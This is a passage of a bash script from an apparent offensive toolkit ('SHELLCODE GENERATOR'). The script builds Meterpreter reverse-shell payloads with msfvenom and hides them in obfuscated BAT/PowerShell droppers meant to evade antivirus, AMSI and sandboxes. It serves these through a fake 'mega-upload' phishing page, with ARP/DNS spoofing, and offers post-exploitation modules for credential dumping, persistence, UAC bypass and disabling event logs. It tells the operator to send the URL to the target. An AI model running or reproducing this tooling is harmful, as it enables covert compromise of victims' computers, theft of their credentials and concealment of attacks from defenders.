serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ps1\n$IPATH/output/installer.bat\n\nchose how to deliver: installer.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store $N4m in apache2 webroot and\nexecute installer.bat on target machine" --info --width 300 > /dev/null 2>&1
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 350 --height 300) > /dev/null 2>&1

  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|installer.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.ps1 $ApAcHe/$N4m.ps1 > /dev/null 2>&1
      cp installer.bat $ApAcHe/installer.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|installer.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.ps1 $ApAcHe/$N4m.ps1
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" 
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.ps1 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (windows BAT) ReL1K :D 
# reproduction of powershell.bat payload in unicorn.py
# ----------------------------------------------------
sh_shellcode12 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: ReL1K" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ReL1K";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
if [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
fi


# display shellcode
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name
cd $IPATH/output/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2
OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" FALSE "Relik PS obfuscation" --width 353 --height 255) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
elif [ "$OBF" = "Relik PS obfuscation" ]; then
echo "powershell /w 1 /C \"s''v rl -;s''v Ln e''c;s''v mYz ((g''v rl).value.toString()+(g''v Ln).value.toString());powershell (g''v mYz).value.toString()('$disp')\"" >> $N4m.bat
else
echo "[✔] String obfuscation technics sellected .."
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
#
# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp
echo "@e%!%ch^O Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\".\"d^ll %temp%\\key^s\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\".\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\Sy^s%dE%te^m%-%32\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\v1.0\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\"I\"^N 1 /^%$'''%n\"O\"N%Func%i  /^eN%GL% $disp),) %i% ,,)" > $N4m.bat
fi
chmod +x $IPATH/output/$N4m.bat


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH

  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi
fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
